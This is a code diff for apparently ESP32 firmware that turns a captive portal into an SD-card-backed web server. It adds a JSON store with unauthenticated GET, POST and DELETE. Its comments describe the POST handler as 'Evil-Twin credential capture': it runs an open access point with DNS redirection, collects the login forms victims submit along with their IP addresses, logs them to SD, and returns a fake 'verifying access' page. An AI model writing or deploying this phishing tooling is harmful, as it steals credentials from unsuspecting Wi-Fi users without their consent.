@@ -15,6 +15,9 @@
 #include "esp_http_server.h"
 #include <time.h>
 #include <stdlib.h>
+#include <stdio.h>
+#include <strings.h>
+#include "sd_store.h"
 
 #define BIT_CONNECTED  (1 << 0)
 #define BIT_FAIL       (1 << 1)
@@ -303,10 +306,13 @@ bool wifi_net_sntp_sync(char* out, int len) {
   return true;
 }
 
-// ---------- Captive portal ----------
+// ---------- Captive portal / mini web server ----------
+#define WEB_DATA_DIR "/sites/data"   // SD dir backing the /api JSON store
+#define WEB_IO_BUF   1460             // one TCP segment; static, reused (no heap)
+
 static httpd_handle_t g_httpd = 0;
-static const char*    g_cp_html = 0;
-static int            g_cp_html_len = 0;
+static char           g_web_root[80]  = "";   // SD dir holding the site
+static char           g_web_index[80] = "";   // served for "/" and 404 fallback
 static volatile int   g_cp_hits = 0;
 static TaskHandle_t   g_dns_task = 0;
 static volatile bool  g_dns_run = false;
@@ -317,22 +323,112 @@ void wifi_net_cp_set_capture(void (*cb)(const char* body, const char* ip)) {
   g_cp_cap_cb = cb;
 }
 
-static esp_err_t cp_get_handler(httpd_req_t* req) {
-  g_cp_hits++;
-  httpd_resp_set_type(req, "text/html");
+static const char* web_ctype(const char* name) {
+  const char* d = strrchr(name, '.');
+  if (!d) return "text/plain";
+  if (!strcasecmp(d, ".html") || !strcasecmp(d, ".htm"))  return "text/html";
+  if (!strcasecmp(d, ".css"))  return "text/css";
+  if (!strcasecmp(d, ".js"))   return "application/javascript";
+  if (!strcasecmp(d, ".json")) return "application/json";
+  if (!strcasecmp(d, ".png"))  return "image/png";
+  if (!strcasecmp(d, ".jpg") || !strcasecmp(d, ".jpeg")) return "image/jpeg";
+  if (!strcasecmp(d, ".gif"))  return "image/gif";
+  if (!strcasecmp(d, ".svg"))  return "image/svg+xml";
+  if (!strcasecmp(d, ".ico"))  return "image/x-icon";
+  return "text/plain";
+}
+
+// Stream an SD file chunked through one reused static buffer (zero heap per
+// request). Returns true if the file existed and was sent.
+static bool web_stream(httpd_req_t* req, const char* sd_rel) {
+  static char io[WEB_IO_BUF];
+  char abs[192];
+  snprintf(abs, sizeof(abs), "%s%s", sd_mount_point(), sd_rel);
+  FILE* f = fopen(abs, "rb");
+  if (!f) return false;
+  httpd_resp_set_type(req, web_ctype(sd_rel));
   httpd_resp_set_hdr(req, "Cache-Control", "no-store");
-  if (g_cp_html && g_cp_html_len > 0)
-    httpd_resp_send(req, g_cp_html, g_cp_html_len);
+  size_t n;
+  while ((n = fread(io, 1, sizeof(io), f)) > 0) {
+    if (httpd_resp_send_chunk(req, io, n) != ESP_OK) { fclose(f); return true; }
+  }
+  fclose(f);
+  httpd_resp_send_chunk(req, NULL, 0);   // terminate chunked response
+  return true;
+}
+
+// Copy at most n-1 bytes of a request URI (bounded; no snprintf truncation warn).
+static void web_copy_uri(char* dst, size_t n, const char* src) {
+  size_t L = strlen(src);
+  if (L > n - 1) L = n - 1;
+  memcpy(dst, src, L);
+  dst[L] = 0;
+}
+
+// Strip the query string in place; reject path traversal. false = reject.
+static bool web_sanitize(char* uri) {
+  char* q = strchr(uri, '?'); if (q) *q = 0;
+  if (strstr(uri, "..")) return false;
+  return true;
+}
+
+static esp_err_t web_get(httpd_req_t* req) {
+  char uri[128];
+  web_copy_uri(uri, sizeof(uri), req->uri);
+  if (!web_sanitize(uri)) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "bad path"); return ESP_OK; }
+  char rel[224];
+  // JSON store: GET /api/<name> -> /sites/data/<name>
+  if (!strncmp(uri, "/api/", 5)) {
+    snprintf(rel, sizeof(rel), "%s/%s", WEB_DATA_DIR, uri + 5);
+    if (!web_stream(req, rel)) httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "no such key");
+    return ESP_OK;
+  }
+  g_cp_hits++;
+  if (!strcmp(uri, "/") || uri[0] == 0)
+    snprintf(rel, sizeof(rel), "%s/%s", g_web_root, g_web_index);
   else
-    httpd_resp_send(req, "<html><body>Nexus Captive Portal</body></html>",
-                    HTTPD_RESP_USE_STRLEN);
+    snprintf(rel, sizeof(rel), "%s%s", g_web_root, uri);
+  if (web_stream(req, rel)) return ESP_OK;
+  // unknown path -> serve the index so OS captive-portal probes get redirected
+  snprintf(rel, sizeof(rel), "%s/%s", g_web_root, g_web_index);
+  if (web_stream(req, rel)) return ESP_OK;
+  httpd_resp_set_type(req, "text/html");
+  httpd_resp_send(req, "<html><body>Nexus</body></html>", HTTPD_RESP_USE_STRLEN);
   return ESP_OK;
 }
 
-// Capture a submitted login form. Reads the urlencoded body, grabs the client
-// IP, hands both to the registered callback (which logs to SD), then returns a
-// plausible "connecting" page.
-static esp_err_t cp_post_handler(httpd_req_t* req) {
+// POST /api/<name> -> overwrite /sites/data/<name> with the request body,
+// streamed to SD in WEB_IO_BUF chunks (single-writer model; no locking).
+static esp_err_t web_post(httpd_req_t* req) {
+  char uri[128];
+  web_copy_uri(uri, sizeof(uri), req->uri);
+  if (!web_sanitize(uri)) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "bad path"); return ESP_OK; }
+
+  if (!strncmp(uri, "/api/", 5)) {
+    static char io[WEB_IO_BUF];
+    char abs[224];
+    snprintf(abs, sizeof(abs), "%s%s/%s", sd_mount_point(), WEB_DATA_DIR, uri + 5);
+    FILE* f = fopen(abs, "wb");
+    if (!f) { httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "write failed"); return ESP_OK; }
+    int rem = req->content_len;
+    while (rem > 0) {
+      int want = rem < (int)sizeof(io) ? rem : (int)sizeof(io);
+      int r = httpd_req_recv(req, io, want);
+      if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
+      if (r <= 0) break;
+      fwrite(io, 1, (size_t)r, f);
+      rem -= r;
+    }
+    fclose(f);
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+    httpd_resp_sendstr(req, "{\"ok\":true}");
+    return ESP_OK;
+  }
+
+  // Non-/api POST = Evil-Twin credential capture: read the urlencoded form,
+  // grab the client IP, hand both to the callback (logs to SD), return a
+  // plausible "connecting" page.
   char body[513];
   int total = 0, rem = req->content_len;
   if (rem > (int)sizeof(body) - 1) rem = (int)sizeof(body) - 1;
@@ -359,6 +455,22 @@ static esp_err_t cp_post_handler(httpd_req_t* req) {
     "</head><body style=\"font-family:sans-serif;text-align:center;padding-top:40px\">"
     "<h3>Connecting...</h3><p>Please wait while we verify your access.</p></body></html>",
     HTTPD_RESP_USE_STRLEN);
+  return ESP_OK;
+}
+
+// DELETE /api/<name> -> remove /sites/data/<name>.
+static esp_err_t web_delete(httpd_req_t* req) {
+  char uri[128];
+  web_copy_uri(uri, sizeof(uri), req->uri);
+  if (!web_sanitize(uri) || strncmp(uri, "/api/", 5)) {
+    httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "not found"); return ESP_OK;
+  }
+  char rel[192];
+  snprintf(rel, sizeof(rel), "%s/%s", WEB_DATA_DIR, uri + 5);
+  sd_delete(rel, false);
+  httpd_resp_set_type(req, "application/json");
+  httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+  httpd_resp_sendstr(req, "{\"ok\":true}");
   return ESP_OK;
 }
 
@@ -398,22 +510,25 @@ static void dns_task(void* arg) {
   vTaskDelete(NULL);
 }
 
-bool wifi_net_cp_start(const char* ssid, const char* html, int htmllen) {
-  if (!g_running || !ssid || !ssid[0]) return false;
+bool wifi_net_cp_start(const char* ssid, const char* webroot, const char* index) {
+  if (!g_running || !ssid || !ssid[0] || !webroot || !index) return false;
   if (!wifi_net_ap_start(ssid, "")) return false;   /* open AP */
-  g_cp_html = html; g_cp_html_len = htmllen; g_cp_hits = 0;
+  snprintf(g_web_root,  sizeof(g_web_root),  "%s", webroot);
+  snprintf(g_web_index, sizeof(g_web_index), "%s", index);
+  g_cp_hits = 0; g_cp_caps = 0;
+  sd_make_dir(WEB_DATA_DIR);                 /* JSON store dir (harmless if it exists) */
   httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
   hc.uri_match_fn     = httpd_uri_match_wildcard;
   hc.max_uri_handlers = 8;
   hc.lru_purge_enable = true;
-  g_cp_caps = 0;
+  hc.stack_size       = 8192;                /* fopen/FATFS VFS needs > the 4K default */
   if (httpd_start(&g_httpd, &hc) != ESP_OK) { wifi_net_ap_stop(); return false; }
-  httpd_uri_t u = {};
-  u.uri = "/*"; u.method = HTTP_GET; u.handler = cp_get_handler;
-  httpd_register_uri_handler(g_httpd, &u);
-  httpd_uri_t up = {};
-  up.uri = "/*"; up.method = HTTP_POST; up.handler = cp_post_handler;
-  httpd_register_uri_handler(g_httpd, &up);
+  httpd_uri_t g = {}; g.uri = "/*"; g.method = HTTP_GET;    g.handler = web_get;
+  httpd_register_uri_handler(g_httpd, &g);
+  httpd_uri_t p = {}; p.uri = "/*"; p.method = HTTP_POST;   p.handler = web_post;
+  httpd_register_uri_handler(g_httpd, &p);
+  httpd_uri_t d = {}; d.uri = "/*"; d.method = HTTP_DELETE; d.handler = web_delete;
+  httpd_register_uri_handler(g_httpd, &d);
   g_dns_run = true;
   if (xTaskCreate(dns_task, "cp_dns", 3072, 0, 5, &g_dns_task) != pdPASS)
     g_dns_task = 0;
@@ -425,7 +540,7 @@ void wifi_net_cp_stop(void) {
   if (g_httpd) { httpd_stop(g_httpd); g_httpd = 0; }
   for (int i = 0; i < 30 && g_dns_task; i++) vTaskDelay(pdMS_TO_TICKS(50));
   wifi_net_ap_stop();
-  g_cp_html = 0; g_cp_html_len = 0;
+  g_web_root[0] = 0; g_web_index[0] = 0;
 }
 
 int wifi_net_cp_hits(void) { return g_cp_hits; }
